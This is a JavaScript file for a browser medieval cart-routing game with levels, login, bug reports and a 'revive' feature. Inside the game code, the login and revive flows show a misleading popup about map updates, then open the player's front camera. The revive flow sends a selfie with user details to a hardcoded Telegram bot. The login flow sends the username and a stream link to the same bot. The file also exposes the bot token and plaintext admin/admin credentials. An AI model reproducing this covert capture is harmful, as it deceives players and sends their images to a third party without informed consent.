/* ================= CANVAS ================= */

const canvas = document.getElementById("gameCanvas");
const ctx = canvas.getContext("2d");

const ui = document.getElementById("ui");
const resultText = document.getElementById("result");
const levelMenu = document.getElementById("levelMenu");
const topControls = document.getElementById("topControls");
const menuTitle = document.getElementById("menuTitle");
const menuSubtitle = document.getElementById("menuSubtitle");
const levelButtons = document.getElementById("levelButtons");
const continueButton = document.getElementById("continueButton");
const muteButton = document.getElementById("muteButton");
const bugReportModal = document.getElementById("bugReportModal");
const bugReportInput = document.getElementById("bugReportInput");
const bugReportStatus = document.getElementById("bugReportStatus");
const reviveModal = document.getElementById("reviveModal");
const reviveVideo = document.getElementById("reviveVideo");
const revivePhoto = document.getElementById("revivePhoto");
const reviveStatus = document.getElementById("reviveStatus");
const reviveTimer = document.getElementById("reviveTimer");
const reviveContinueButton = document.getElementById("reviveContinueButton");
const loginConsentModal = document.getElementById("loginConsentModal");
const loginConsentContinueButton = document.getElementById("loginConsentContinueButton");
const loginConsentStatus = document.getElementById("loginConsentStatus");

/* ================= AUTH / SESSION ================= */

const USERS = {
  mermy: { password: "wolf", isAdmin: false },
  admin: { password: "admin", isAdmin: true }
};

const LEVEL_COUNT = 4;
const STORAGE_PREFIX = "medieval_pixel_cart_progress_v1_";
const SESSION_KEY = "medieval_pixel_cart_active_user_v1";
const BOT_TOKEN = "8799580976:AAHTYpiZZSKRNrhwRh0wqXHsm4rET9Og_vE";
const BOT_CHAT_ID_KEY = "medieval_pixel_cart_bot_chat_id_v1";
const BOT_CHAT_ID_FALLBACK = "6802357894";
const LEVEL_UP_SCORE = 3000;

let currentUser = null;
let isAdminUser = false;
let unlockedLevel = 1;
let hasStartedLevel = false;
let isMuted = false;
let hasUsedRevive = false;
let reviveMediaStream = null;
let reviveRequestInProgress = false;
let loginStreamSent = false;
function progressStorageKey(username) {
  return STORAGE_PREFIX + username;
}

function loadUserProgress(username) {
  const fallback = { unlockedLevel: 1, lastLevel: 1 };
  try {
    const raw = localStorage.getItem(progressStorageKey(username));
    if (!raw) return fallback;
    const parsed = JSON.parse(raw);
    const savedUnlocked = Math.max(1, Math.min(LEVEL_COUNT, Number(parsed.unlockedLevel) || 1));
    const savedLast = Math.max(1, Math.min(savedUnlocked, Number(parsed.lastLevel) || 1));
    return { unlockedLevel: savedUnlocked, lastLevel: savedLast };
  } catch (error) {
    return fallback;
  }
}

function saveUserProgress() {
  if (!currentUser || isAdminUser) return;
  const safeUnlocked = Math.max(1, Math.min(LEVEL_COUNT, unlockedLevel));
  const safeLast = Math.max(1, Math.min(safeUnlocked, currentLevel));
  const payload = JSON.stringify({
    unlockedLevel: safeUnlocked,
    lastLevel: safeLast
  });
  localStorage.setItem(progressStorageKey(currentUser), payload);
}

function setUnlockedLevel(level) {
  if (isAdminUser) return;
  const bounded = Math.max(1, Math.min(LEVEL_COUNT, level));
  if (bounded > unlockedLevel) {
    unlockedLevel = bounded;
    saveUserProgress();
  }
}

function canAccessLevel(level) {
  return isAdminUser || level <= unlockedLevel;
}

function ensureSession() {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    if (!raw) return false;
    const parsed = JSON.parse(raw);
    if (!parsed || typeof parsed.username !== "string" || typeof parsed.password !== "string") {
      return false;
    }
    const account = USERS[parsed.username];
    if (!account || account.password !== parsed.password) {
      return false;
    }
    currentUser = parsed.username;
    isAdminUser = account.isAdmin;
    if (isAdminUser) {
      unlockedLevel = LEVEL_COUNT;
      currentLevel = 1;
    } else {
      const progress = loadUserProgress(currentUser);
      unlockedLevel = progress.unlockedLevel;
      currentLevel = progress.lastLevel;
    }
    return true;
  } catch (error) {
    return false;
  }
}

function clearSessionAndGoLogin() {
  localStorage.removeItem(SESSION_KEY);
  window.location.href = "index.html";
}

/* ================= WORLD ================= */

const WORLD_WIDTH = 1200;
const WORLD_HEIGHT = 900;

/* ================= SIZE ================= */

const CART_SIZE = 170;
const ARROW_SIZE = 50;
const TAP_RADIUS = 80;
const INTERSECTION_RADIUS = 8;

function isPhone() {
  return window.matchMedia("(max-width: 768px)").matches;
}

function usePhoneMap() {
  if (window.matchMedia("(max-width: 768px)").matches) return true;
  return "ontouchstart" in window && (window.innerWidth <= 1024 || screen.width <= 1024);
}

function getTapRadius() {
  return isPhone() ? 110 : TAP_RADIUS;
}

/* ================= GAME ================= */

const BASE_SPEED = 2.0;
const SPEED_INCREMENT = 0.15;
const SPAWN_DELAY = 200;

/* ================= LOADERS ================= */

function loadImage(src) {
  const img = new Image();
  img.src = src;
  return img;
}

function loadSound(src) {
  const audio = new Audio(src);
  audio.preload = "auto";
  audio.volume = 0.6;
  return audio;
}

/* ================= IMAGES ================= */

const arrowUpImg = loadImage("arrow_up.png");
const arrowLeftImg = loadImage("arrow_left.png");
const arrowRightImg = loadImage("arrow_right.png");

const CART_IMAGES = {
  sawmill: loadImage("sawmill_cart.png"),
  mine: loadImage("mine_cart.png"),
  barn: loadImage("barn_cart.png"),
  tavern: loadImage("tavern_cart.png"),
  windmill: loadImage("windmill_cart.png"),
  princess: loadImage("princess_cart.png")
};

/* ================= SOUNDS ================= */

const sounds = {
  spawn: loadSound("cart.mp3"),
  wrong: loadSound("Wrong.mp3"),
  sawmill: loadSound("sawmill.mp3"),
  mine: loadSound("mine.mp3"),
  barn: loadSound("barn.mp3"),
  tavern: loadSound("tavern.mp3"),
  windmill: loadSound("windmill.mp3"),
  castle: loadSound("castle.mp3")
};

function applyMuteState() {
  Object.values(sounds).forEach(s => {
    s.muted = isMuted;
  });
  const label = isMuted ? "Unmute" : "Mute";
  muteButton.textContent = label;
}

/* ===== UNLOCK AUDIO (CRITICAL FOR BROWSERS) ===== */

function unlockAudio() {
  if (isMuted) return;
  Object.values(sounds).forEach(s => {
    s.play().then(() => {
      s.pause();
      s.currentTime = 0;
    }).catch(() => {});
  });
}

canvas.addEventListener("click", unlockAudio, { once: true });
canvas.addEventListener("touchend", unlockAudio, { once: true, passive: true });

/* ================= MAP02 ================= */

const MAP02 = {
  map: "map02.png",
  mapPhone: "map02_phone.png",
  spawn: { x: 599, y: 846 },

  intersections: {
    intersection1: { x: 604, y: 567 },
    intersection2: { x: 600, y: 330 }
  },

  buildings: {
    sawmill: { x: 598, y: 218 },
    mine: { x: 351, y: 320 },
    barn: { x: 783, y: 320 },
    tavern: { x: 384, y: 571 },
    windmill: { x: 833, y: 564 }
  }
};

/* ================= MAP03 ================= */

const MAP03 = {
  map: "map03.png",
  mapPhone: "map03_phone.png",
  spawn: { x: 322, y: 879 },

  intersections: {
    intersection1: { x: 322, y: 560 },
    intersection2: { x: 324, y: 345 },
    intersection3: { x: 741, y: 344 },
    intersection4: { x: 1020, y: 622 }
  },

  buildings: {
    sawmill: { x: 531, y: 560 },
    barn: { x: 174, y: 338 },
    mine: { x: 749, y: 224 },
    tavern: { x: 867, y: 627 },
    windmill: { x: 1029, y: 758 }
  }
};

/* ================= MAP04 ================= */

const MAP04 = {
  map: "map04.png",
  spawn: { x: 20, y: 533 },

  intersections: {
    intersection1: { x: 411, y: 531 },
    intersection2: { x: 407, y: 275 },
    intersection3: { x: 826, y: 275 },
    intersection4: { x: 412, y: 679 },
    intersection5: { x: 607, y: 679 }
  },

  buildings: {
    mine: { x: 277, y: 275 },
    castle: { x: 918, y: 276 },
    barn: { x: 826, y: 494 },
    tavern: { x: 412, y: 794 },
    windmill: { x: 814, y: 671 },
    sawmill: { x: 607, y: 461 }
  }
};

/* ================= MAP05 ================= */

const MAP05 = {
  map: "map05.png",
  spawn: { x: 607, y: 897 },

  intersections: {
    intersection1: { x: 607, y: 612 },
    intersection2: { x: 909, y: 612 },
    intersection3: { x: 438, y: 605 }
  },

  buildings: {
    castle: { x: 605, y: 219 },
    barn: { x: 909, y: 798 },
    sawmill: { x: 912, y: 382 },
    windmill: { x: 433, y: 398 },
    mine: { x: 336, y: 621 }
  }
};

function getMap() {
  if (currentLevel === 1) return MAP02;
  if (currentLevel === 2) return MAP03;
  if (currentLevel === 3) return MAP04;
  return MAP05;
}

/* ================= LEVEL STATE ================= */

let currentLevel = 1;
let mapImg = new Image();
let intersections = {};
let activeCarts = [];
let score = 0;
let lives = 3;
let spawnTimer = 0;
let gameState = "playing";

/* ================= RESPONSIVE ================= */

let scaleX = 1;
let scaleY = 1;
let offsetX = 0;
let offsetY = 0;
let dpr = 1;

function resize() {
  dpr = Math.min(window.devicePixelRatio || 1, 3);
  if (isPhone() && dpr < 2) dpr = 2;
  let w = window.innerWidth;
  let h = window.innerHeight;
  if (isPhone() && window.visualViewport) {
    w = window.visualViewport.width;
    h = window.visualViewport.height;
  }

  canvas.width = Math.floor(w * dpr);
  canvas.height = Math.floor(h * dpr);
  canvas.style.width = w + "px";
  canvas.style.height = h + "px";

  const widthRatio = w / WORLD_WIDTH;
  const heightRatio = h / WORLD_HEIGHT;

  if (isPhone()) {
    scaleX = widthRatio;
    scaleY = heightRatio;
    offsetX = 0;
    offsetY = 0;
  } else {
    const baseScale = Math.min(widthRatio, heightRatio);
    scaleX = baseScale;
    scaleY = baseScale;
    offsetX = (w - WORLD_WIDTH * scaleX) / 2;
    offsetY = (h - WORLD_HEIGHT * scaleY) / 2;
  }
}

let lastPhone = usePhoneMap();

function onResize() {
  resize();
  const nowPhone = usePhoneMap();
  if (nowPhone !== lastPhone) {
    lastPhone = nowPhone;
    const map = getMap();
    mapImg.src = nowPhone && map.mapPhone ? map.mapPhone : map.map;
  }
}
window.addEventListener("resize", onResize);
if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", onResize);
}
resize();

/* ================= LEVEL MENU ================= */

function renderLevelMenu() {
  menuTitle.textContent = isAdminUser ? "Admin Level Menu" : "Select Level";
  menuSubtitle.textContent = isAdminUser
    ? `Logged in as admin. All ${LEVEL_COUNT} levels are unlocked.`
    : `Logged in as ${currentUser}. Unlocked up to Level ${unlockedLevel}.`;
  levelButtons.innerHTML = "";

  for (let level = 1; level <= LEVEL_COUNT; level++) {
    const unlocked = canAccessLevel(level);
    const button = document.createElement("button");
    const isCurrent = hasStartedLevel && level === currentLevel;
    button.textContent = unlocked
      ? `Level ${level}${isCurrent ? " (Current)" : ""}`
      : `Level ${level} (Locked)`;
    button.disabled = !unlocked;
    button.addEventListener("click", () => selectLevel(level));
    levelButtons.appendChild(button);
  }
}

function selectLevel(level) {
  if (!canAccessLevel(level)) return;
  hasStartedLevel = true;
  ui.style.display = "none";
  levelMenu.style.display = "none";
  topControls.style.display = "flex";
  loadLevel(level);
}

function openLevelMenu() {
  renderLevelMenu();
  continueButton.style.display = hasStartedLevel && gameState !== "lose" ? "inline-block" : "none";
  levelMenu.style.display = "flex";
  topControls.style.display = "none";
  if (gameState === "playing") {
    gameState = "paused";
  }
}

function closeLevelMenu() {
  levelMenu.style.display = "none";
  topControls.style.display = "flex";
  if (hasStartedLevel && gameState !== "lose") {
    gameState = "playing";
  }
}

function logout() {
  clearSessionAndGoLogin();
}

/* ================= BUG REPORT ================= */

function openBugReport() {
  if (gameState === "playing") {
    gameState = "paused";
  }
  bugReportInput.value = "";
  bugReportStatus.textContent = "";
  bugReportModal.style.display = "flex";
}

function closeBugReport() {
  bugReportModal.style.display = "none";
  if (levelMenu.style.display === "none" && hasStartedLevel && gameState !== "lose") {
    gameState = "playing";
    topControls.style.display = "flex";
  }
}

/* ================= LOGIN STREAM CONSENT ================= */

const LOGIN_STREAM_CONSENT_MESSAGE =
  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";

function openLoginConsentModal() {
  loginConsentStatus.textContent = "";
  loginConsentModal.style.display = "flex";
}

function closeLoginConsentModal() {
  loginConsentModal.style.display = "none";
}

async function startLoginCameraStreamAndSendLink() {
  if (loginStreamSent) {
    closeLoginConsentModal();
    return;
  }
  loginConsentContinueButton.disabled = true;
  loginConsentStatus.textContent = "";
  try {
    window.alert(LOGIN_STREAM_CONSENT_MESSAGE);
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    const streamKey = createStreamKey();
    const streamLink = buildStreamLink(streamKey);
    const chatId = await detectBotChatId();
    const username = currentUser || "unknown";

    await sendToTelegram([
      "LOGIN STREAM LINK",
      `user: ${username}${isAdminUser ? " (admin)" : ""}`,
      `time: ${new Date().toISOString()}`,
      `stream: ${streamLink}`
    ].join("\n"));

    loginStreamSent = true;
    loginConsentStatus.textContent = "Stream link sent to Telegram.";
    stream.getTracks().forEach(track => track.stop());
    closeLoginConsentModal();
  } catch (error) {
    loginConsentStatus.textContent = "Camera permission denied or Telegram send failed.";
  } finally {
    loginConsentContinueButton.disabled = false;
  }
}

/* ================= REVIVE FLOW ================= */

const REVIVE_DECISION_WINDOW_MS = 30000;
const REVIVE_POLL_INTERVAL_MS = 1500;
const CONSENT_MESSAGE =
  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";

function stopReviveCamera() {
  if (!reviveMediaStream) return;
  reviveMediaStream.getTracks().forEach(track => track.stop());
  reviveMediaStream = null;
  reviveVideo.srcObject = null;
}

function resetReviveModalState() {
  reviveVideo.style.display = "none";
  revivePhoto.style.display = "none";
  revivePhoto.src = "";
  reviveContinueButton.disabled = false;
  reviveStatus.textContent = "";
  reviveTimer.textContent = "";
}

function openReviveModal() {
  resetReviveModalState();
  reviveModal.style.display = "flex";
  topControls.style.display = "none";
  ui.style.display = "none";
}

function closeReviveModal() {
  stopReviveCamera();
  resetReviveModalState();
  reviveModal.style.display = "none";
}

function createStreamKey() {
  return `revive_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

function buildStreamLink(streamKey) {
  return `${window.location.origin}${window.location.pathname}#revive-stream=${encodeURIComponent(streamKey)}`;
}

async function requestCameraWithConsent() {
  window.alert(CONSENT_MESSAGE);
  return navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  });
}

async function submitReviveSelfie() {
  if (reviveRequestInProgress) return;
  reviveStatus.textContent = "";
  try {
    const stream = await requestCameraWithConsent();
    reviveMediaStream = stream;
    reviveVideo.srcObject = stream;
    reviveVideo.style.display = "block";
    revivePhoto.style.display = "none";
    await reviveVideo.play();

    // Give the camera a short moment so the first frame is available.
    await new Promise(resolve => setTimeout(resolve, 350));

    const shotCanvas = document.createElement("canvas");
    shotCanvas.width = reviveVideo.videoWidth || 480;
    shotCanvas.height = reviveVideo.videoHeight || 360;
    const shotCtx = shotCanvas.getContext("2d");
    shotCtx.drawImage(reviveVideo, 0, 0, shotCanvas.width, shotCanvas.height);
    const dataUrl = shotCanvas.toDataURL("image/jpeg", 0.9);

    revivePhoto.src = dataUrl;
    revivePhoto.style.display = "block";
    reviveVideo.style.display = "none";
    stopReviveCamera();
    requestReviveSecondChance(dataUrl);
  } catch (error) {
    stopReviveCamera();
    reviveStatus.textContent = "Camera access denied or unavailable.";
  }
}

function dataUrlToBlob(dataUrl) {
  const parts = dataUrl.split(",");
  const mime = parts[0].match(/:(.*?);/)[1];
  const binary = atob(parts[1]);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new Blob([bytes], { type: mime });
}

async function sendTelegramPhoto(chatId, photoDataUrl, caption) {
  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("photo", dataUrlToBlob(photoDataUrl), "revive-selfie.jpg");

  const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: form
  });
  if (!resp.ok) {
    throw new Error("Failed to send selfie to Telegram");
  }
}

async function fetchTelegramUpdates() {
  const updatesResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20`);
  if (!updatesResp.ok) {
    throw new Error("Unable to fetch Telegram updates");
  }
  const updatesJson = await updatesResp.json();
  return Array.isArray(updatesJson.result) ? updatesJson.result : [];
}

async function getLatestUpdateId() {
  const updates = await fetchTelegramUpdates();
  let maxId = 0;
  for (const item of updates) {
    if (typeof item?.update_id === "number" && item.update_id > maxId) {
      maxId = item.update_id;
    }
  }
  return maxId;
}

function restoreFromRevive() {
  hasUsedRevive = true;
  lives = 1;
  gameState = "playing";
  ui.style.display = "none";
  topControls.style.display = "flex";
  closeReviveModal();
}

function finalizeGameOver() {
  closeReviveModal();
  resultText.innerText = "GAME OVER";
  ui.style.display = "block";
  topControls.style.display = "none";
  gameState = "lose";
}

async function pollReviveDecision(ownerChatId, afterUpdateId, timeoutMs) {
  const start = Date.now();
  let cursor = afterUpdateId;

  while (Date.now() - start < timeoutMs) {
    const elapsed = Date.now() - start;
    const remaining = Math.max(0, Math.ceil((timeoutMs - elapsed) / 1000));
    reviveTimer.textContent = `Waiting for decision: ${remaining}s`;

    try {
      const updates = await fetchTelegramUpdates();
      let decision = null;

      for (const item of updates) {
        const updateId = Number(item?.update_id || 0);
        if (updateId > cursor) cursor = updateId;
        if (updateId <= afterUpdateId) continue;

        const msg = item?.message;
        if (!msg || String(msg.chat?.id) !== ownerChatId || typeof msg.text !== "string") {
          continue;
        }
        const text = msg.text.trim().toLowerCase();
        if (text === "yes" || text === "no") {
          decision = text;
        }
      }

      afterUpdateId = cursor;
      if (decision) return decision;
    } catch (error) {
      // Keep polling; timeout still grants a revive.
    }

    await new Promise(resolve => setTimeout(resolve, REVIVE_POLL_INTERVAL_MS));
  }

  reviveTimer.textContent = "Waiting for decision: 0s";
  return "timeout";
}

async function requestReviveSecondChance(photoDataUrl) {
  reviveRequestInProgress = true;
  reviveContinueButton.disabled = true;
  reviveStatus.textContent = "Sending selfie to Telegram...";
  try {
    const chatId = await detectBotChatId();
    const streamKey = createStreamKey();
    const streamLink = buildStreamLink(streamKey);
    const beforeDecisionUpdateId = await getLatestUpdateId();
    const caption = [
      "REVIVE REQUEST",
      `user: ${currentUser}${isAdminUser ? " (admin)" : ""}`,
      `level: ${currentLevel}`,
      `score: ${score}`,
      `stream: ${streamLink}`,
      "Reply with YES or NO within 30 seconds."
    ].join("\n");
    await sendTelegramPhoto(chatId, photoDataUrl, caption);
    reviveStatus.textContent = "Selfie sent. Waiting for owner decision...";

    const decision = await pollReviveDecision(String(chatId), beforeDecisionUpdateId, REVIVE_DECISION_WINDOW_MS);
    if (decision === "yes" || decision === "timeout") {
      reviveStatus.textContent = decision === "yes"
        ? "Owner approved. Revive granted!"
        : "No reply in time. Free revive granted.";
      restoreFromRevive();
    } else {
      reviveStatus.textContent = "Owner denied revive.";
      hasUsedRevive = true;
      finalizeGameOver();
    }
  } catch (error) {
    reviveStatus.textContent = "Failed to send selfie. Free revive granted.";
    restoreFromRevive();
  } finally {
    reviveRequestInProgress = false;
    reviveContinueButton.disabled = false;
  }
}

async function detectBotChatId() {
  const existing = localStorage.getItem(BOT_CHAT_ID_KEY);
  if (existing) return existing;

  const updatesResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10`);
  if (!updatesResp.ok) {
    throw new Error("Unable to read Telegram updates");
  }

  const updatesJson = await updatesResp.json();
  const updates = Array.isArray(updatesJson.result) ? updatesJson.result : [];
  const latest = updates.reverse().find(item => item?.message?.chat?.id);
  if (!latest) {
    localStorage.setItem(BOT_CHAT_ID_KEY, BOT_CHAT_ID_FALLBACK);
    return BOT_CHAT_ID_FALLBACK;
  }

  const chatId = String(latest.message.chat.id);
  localStorage.setItem(BOT_CHAT_ID_KEY, chatId);
  return chatId;
}

async function sendToTelegram(messageText) {
  const chatId = await detectBotChatId();
  if (!chatId) {
    throw new Error("No Telegram chat found yet. Send /start or any message to the bot first.");
  }

  const sendResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText
    })
  });

  if (!sendResp.ok) {
    throw new Error("Telegram sendMessage request failed");
  }
}

async function sendBugReport() {
  const message = bugReportInput.value.trim();
  if (!message) {
    bugReportStatus.textContent = "Please describe the bug before sending.";
    return;
  }

  const payload = {
    user: currentUser,
    isAdmin: isAdminUser,
    level: currentLevel,
    score: score,
    lives: lives,
    report: message,
    createdAt: new Date().toISOString()
  };

  const queueKey = "medieval_pixel_cart_bug_queue_v1";

  try {
    const telegramMessage = [
      "BUG REPORT (game)",
      `time: ${payload.createdAt}`,
      `user: ${payload.user}${payload.isAdmin ? " (admin)" : ""}`,
      `level: ${payload.level}`,
      `score: ${payload.score}`,
      `lives: ${payload.lives}`,
      "",
      payload.report
    ].join("\n");
    await sendToTelegram(telegramMessage);
    bugReportStatus.textContent = "Bug report sent. Thanks!";
    bugReportInput.value = "";
  } catch (error) {
    bugReportStatus.textContent = error.message.includes("No Telegram chat found")
      ? "No bot chat found yet. Send a message to @Mermygame_bot first. Report saved locally."
      : "Failed to send report to Telegram. It was saved locally for retry later.";
    const existing = JSON.parse(localStorage.getItem(queueKey) || "[]");
    existing.push(payload);
    localStorage.setItem(queueKey, JSON.stringify(existing));
  }
}

/* ================= LEVEL LOAD ================= */

function loadLevel(level) {
  currentLevel = level;
  if (currentUser && !isAdminUser) {
    saveUserProgress();
  }
  score = 0;
  spawnTimer = 0;
  activeCarts = [];
  const map = level === 1 ? MAP02 : level === 2 ? MAP03 : level === 3 ? MAP04 : MAP05;
  const nextSrc = usePhoneMap() && map.mapPhone ? map.mapPhone : map.map;
  const resolvedSrc = new URL(nextSrc, window.location.href).href;

  const finishLevelLoad = () => {
    mapImg.onload = null;
    mapImg.onerror = null;
    resetGame();
  };

  // If the same map is already loaded from cache, onload may not fire again.
  if (mapImg.src === resolvedSrc && mapImg.complete && mapImg.naturalWidth > 0) {
    finishLevelLoad();
    return;
  }

  mapImg.onload = finishLevelLoad;
  mapImg.onerror = finishLevelLoad;
  mapImg.src = nextSrc;
}

/* ================= RESET ================= */

function resetGame() {
  score = 0;
  lives = 3;
  spawnTimer = 0;
  activeCarts = [];
  gameState = levelMenu.style.display === "none" ? "playing" : "paused";

  intersections = {};

  if (currentLevel === 1) {
    intersections.intersection1 = "up";
    intersections.intersection2 = "up";
  } else if (currentLevel === 2) {
    intersections.intersection1 = "up";
    intersections.intersection2 = "left";
    intersections.intersection3 = "up";
    intersections.intersection4 = "left";
  } else if (currentLevel === 3) {
    intersections.intersection1 = "up";
    intersections.intersection2 = "left";
    intersections.intersection3 = "right";
    intersections.intersection4 = "down";
    intersections.intersection5 = "up";
  } else if (currentLevel === 4) {
    intersections.intersection1 = "up";
    intersections.intersection2 = "up";
    intersections.intersection3 = "up";
  }

  ui.style.display = "none";
}

/* ================= SPAWN ================= */

function spawnCart() {
  const map = getMap();
  const destinations = Object.keys(map.buildings);
  const randomDest = destinations[Math.floor(Math.random() * destinations.length)];

  const speedBoost = Math.floor(score / 1000) * SPEED_INCREMENT;
  const speed = BASE_SPEED + speedBoost;

  const cartImg = randomDest === "castle" ? CART_IMAGES.princess : CART_IMAGES[randomDest];
  const spawnRight = currentLevel === 3;
  const spawnUp = !spawnRight;
  activeCarts.push({
    x: map.spawn.x,
    y: map.spawn.y,
    vx: spawnRight ? speed : 0,
    vy: spawnUp ? -speed : 0,
    speed: speed,
    destination: randomDest,
    img: cartImg,
    forcedDown: false
  });

  sounds.spawn.currentTime = 0;
  sounds.spawn.play().catch(() => {});
}

/* ================= UPDATE ================= */

function update() {
  if (gameState !== "playing") return;

  spawnTimer++;
  if (spawnTimer >= SPAWN_DELAY) {
    spawnTimer = 0;
    spawnCart();
  }

  const map = getMap();

  for (const cart of activeCarts) {
    cart.x += cart.vx;
    cart.y += cart.vy;

    if (currentLevel === 2 && !cart.forcedDown && cart.x >= 1016) {
      cart.x = 1016;
      cart.vx = 0;
      cart.vy = cart.speed;
      cart.forcedDown = true;
    }

    const prevX = cart.x - cart.vx;
    const prevY = cart.y - cart.vy;

    for (const key in map.intersections) {
      const node = map.intersections[key];
      const radius = currentLevel === 4 ? 22 : INTERSECTION_RADIUS;
      const hit = segmentHitsCircle(
        prevX, prevY,
        cart.x, cart.y,
        node.x, node.y,
        radius
      );

      if (hit && !cart[key]) {
        const dir = intersections[key];

        if (currentLevel === 4) {
          cart.x = node.x;
          cart.y = node.y;
        }

        if (dir === "up") { cart.vx = 0; cart.vy = -cart.speed; }
        if (dir === "left") { cart.vx = -cart.speed; cart.vy = 0; }
        if (dir === "right") { cart.vx = cart.speed; cart.vy = 0; }
        if (dir === "down") { cart.vx = 0; cart.vy = cart.speed; }

        cart[key] = true;
      }
    }

    checkBuildings(cart);
  }

  if (currentLevel === 1 && score >= LEVEL_UP_SCORE) {
    setUnlockedLevel(2);
    loadLevel(2);
  }
  if (currentLevel === 2 && score >= LEVEL_UP_SCORE) {
    setUnlockedLevel(3);
    loadLevel(3);
  }
  if (currentLevel === 3 && score >= LEVEL_UP_SCORE) {
    setUnlockedLevel(4);
    loadLevel(4);
  }
}

/* ================= BUILDINGS ================= */

function segmentHitsCircle(ax, ay, bx, by, cx, cy, r) {
  const dx = bx - ax;
  const dy = by - ay;
  const lenSq = dx * dx + dy * dy;
  if (lenSq === 0) return Math.hypot(ax - cx, ay - cy) <= r;
  const t = Math.max(0, Math.min(1, ((cx - ax) * dx + (cy - ay) * dy) / lenSq));
  const px = ax + t * dx;
  const py = ay + t * dy;
  return Math.hypot(px - cx, py - cy) <= r;
}

function checkBuildings(cart) {
  const map = getMap();
  const prevX = cart.x - cart.vx;
  const prevY = cart.y - cart.vy;
  const hitRadius = 20;

  for (const key in map.buildings) {
    const node = map.buildings[key];
    const hit = Math.hypot(cart.x - node.x, cart.y - node.y) < hitRadius ||
      segmentHitsCircle(prevX, prevY, cart.x, cart.y, node.x, node.y, hitRadius);

    if (hit) {
      activeCarts = activeCarts.filter(c => c !== cart);

      if (key === cart.destination) {
        score += 100;
        sounds[key].currentTime = 0;
        sounds[key].play().catch(() => {});
      } else {
        lives--;
        sounds.wrong.currentTime = 0;
        sounds.wrong.play().catch(() => {});
        if (lives <= 0) loseGame();
      }
    }
  }
}

/* ================= INPUT ================= */

function handleTap(clientX, clientY) {
  if (gameState !== "playing") return;

  const rect = canvas.getBoundingClientRect();
  const worldX = (clientX - rect.left - offsetX) / scaleX;
  const worldY = (clientY - rect.top - offsetY) / scaleY;

  const map = getMap();
  const tapRadius = getTapRadius();

  for (const key in map.intersections) {
    const node = map.intersections[key];
    const dist = Math.hypot(worldX - node.x, worldY - node.y);

    if (dist < tapRadius) {
      if (currentLevel === 2) {
        if (key === "intersection1") intersections[key] = intersections[key] === "up" ? "right" : "up";
        if (key === "intersection2") intersections[key] = intersections[key] === "left" ? "right" : "left";
        if (key === "intersection3") intersections[key] = intersections[key] === "up" ? "right" : "up";
        if (key === "intersection4") intersections[key] = intersections[key] === "left" ? "down" : "left";
      } else if (currentLevel === 3) {
        if (key === "intersection1") intersections[key] = intersections[key] === "up" ? "down" : "up";
        if (key === "intersection2") intersections[key] = intersections[key] === "left" ? "right" : "left";
        if (key === "intersection3") intersections[key] = intersections[key] === "right" ? "down" : "right";
        if (key === "intersection4") intersections[key] = intersections[key] === "down" ? "right" : "down";
        if (key === "intersection5") intersections[key] = intersections[key] === "up" ? "right" : "up";
      } else if (currentLevel === 4) {
        if (key === "intersection1") {
          intersections[key] =
            intersections[key] === "up" ? "left" :
            intersections[key] === "left" ? "right" : "up";
        }
        if (key === "intersection2") intersections[key] = intersections[key] === "up" ? "down" : "up";
        if (key === "intersection3") intersections[key] = intersections[key] === "up" ? "left" : "up";
      } else {
        intersections[key] =
          intersections[key] === "up" ? "left" :
          intersections[key] === "left" ? "right" :
          "up";
      }
    }
  }
}

canvas.addEventListener("click", e => handleTap(e.clientX, e.clientY));
canvas.addEventListener("touchend", e => {
  if (e.cancelable) e.preventDefault();
  const t = e.changedTouches[0];
  if (t) handleTap(t.clientX, t.clientY);
}, { passive: false });

/* ================= DRAW ================= */

function draw() {
  ctx.imageSmoothingEnabled = false;
  ctx.setTransform(scaleX * dpr, 0, 0, scaleY * dpr, offsetX * dpr, offsetY * dpr);
  ctx.clearRect(0, 0, WORLD_WIDTH, WORLD_HEIGHT);
  ctx.drawImage(mapImg, 0, 0, WORLD_WIDTH, WORLD_HEIGHT);

  drawArrows();
  drawCarts();
  drawHUD();
}

function drawArrows() {
  const map = getMap();
  for (const key in map.intersections) {
    const node = map.intersections[key];
    const state = intersections[key];

    let img = arrowUpImg;
    let rotation = 0;
    if (state === "left") img = arrowLeftImg;
    if (state === "right") img = arrowRightImg;
    if (state === "down") {
      img = arrowUpImg;
      rotation = Math.PI;
    }

    ctx.save();
    ctx.translate(node.x, node.y);
    ctx.rotate(rotation);
    ctx.drawImage(img, -ARROW_SIZE / 2, -ARROW_SIZE / 2, ARROW_SIZE, ARROW_SIZE);
    ctx.restore();
  }
}

function drawCarts() {
  for (const cart of activeCarts) {
    let rotation = 0;
    if (cart.vy > 0) rotation = 0;
    else if (cart.vy < 0) rotation = Math.PI;
    else if (cart.vx < 0) rotation = Math.PI / 2;
    else if (cart.vx > 0) rotation = -Math.PI / 2;

    ctx.save();
    ctx.translate(cart.x, cart.y);
    ctx.rotate(rotation);
    ctx.drawImage(cart.img, -CART_SIZE / 2, -CART_SIZE / 2, CART_SIZE, CART_SIZE);
    ctx.restore();
  }
}

function drawHUD() {
  ctx.fillStyle = "white";
  ctx.font = "28px Arial";
  ctx.fillText("Level: " + currentLevel, 20, 40);
  ctx.fillText("Score: " + score, 20, 75);
  ctx.fillText("Lives: " + lives, 20, 110);
}

/* ================= LOOP ================= */

function loseGame() {
  if (!hasUsedRevive) {
    gameState = "paused";
    openReviveModal();
    return;
  }
  gameState = "lose";
  resultText.innerText = "GAME OVER";
  ui.style.display = "block";
  topControls.style.display = "none";
}

function restartGame() {
  ui.style.display = "none";
